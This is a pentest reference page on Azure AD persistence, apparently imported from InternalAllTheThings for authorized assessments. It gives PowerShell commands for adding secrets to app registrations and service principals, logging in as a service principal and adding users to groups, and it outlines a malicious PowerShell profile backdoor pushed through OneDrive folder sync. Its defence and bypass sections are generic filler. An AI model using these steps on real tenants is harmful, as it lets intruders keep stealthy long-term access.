---
title: Azure AD - Persistence
type: technique
tags: [active-directory, azure, cloud, persistence, reference-import]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure AD - Persistence

## What it is

Technical reference for **Azure AD - Persistence** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Attackers establish persistence in Azure AD by adding client secrets or certificates to existing application registrations, creating new service principals, or assigning privileged directory roles to attacker-controlled accounts. Adding a secret to a high-privilege application service principal gives the attacker durable, password-authenticated access that survives user password resets and MFA changes. Azure AD does not alert by default when secrets are added to applications, making this a stealthy long-term persistence mechanism.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Add Secrets to Application

* Add secrets with [lutzenfried/OffensiveCloud/Add-AzADAppSecret.ps1](https://github.com/lutzenfried/OffensiveCloud/blob/main/Azure/Tools/Add-AzADAppSecret.ps1)

```powershell
PS > . C:\Tools\Add-AzADAppSecret.ps1
PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

* Use secrets to authenticate as Service Principal

```ps1
PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password)
PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
```

## Add Service Principal

* Generate a new service principal password/secret

```ps1
Import-Module Microsoft.Graph.Applications
Connect-MgGraph 
$servicePrincipalId = "<service-principal-id>"

$params = @{
    passwordCredential = @{
        displayName = "NewCreds"
    }
}
Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipalId -BodyParameter $params
```

## Add User to Group

```ps1
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```

## PowerShell Profile Backdoor Using KFM

OneDrive for Business Known Folder Move (KFM) is a feature in Microsoft OneDrive for Business that enables users and organizations to automatically redirect the contents of key Windows user folders; Desktop, Documents, and Pictures from their local PC to OneDrive.

A PowerShell profile is a script file that loads whenever you start a new PowerShell session (such as opening PowerShell or Windows Terminal). Users and administrators often customize their profiles to set aliases, environment variables, functions, or pre-load modules.

**Requirements**:

* `Files.ReadWrite.All` privilege

**Methodology**:

Known Folder Move moves the user's Documents (and/or Desktop, Pictures) folder to OneDrive for Business, typically syncing:

```ps1
C:\Users\<username>\Documents → C:\Users\<username>\OneDrive - <TenantName>\Documents
```

This means the PowerShell profile file (`Documents\PowerShell\Microsoft.PowerShell_profile.ps1`) will now be synced to OneDrive.

Push a malicious PowerShell profile at `$HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1`.

## References

* [High-Profile Cloud Privesc - Leonidas Tsaousis - July 15, 2025](https://labs.reversec.com/posts/2025/07/high-profile-cloud-privesc)
* [Maintaining Azure Persistence via automation accounts - Karl Fosaaen - September 12, 2019](https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/)
* [Microsoft Graph - servicePrincipal: addPassword](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=powershell)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
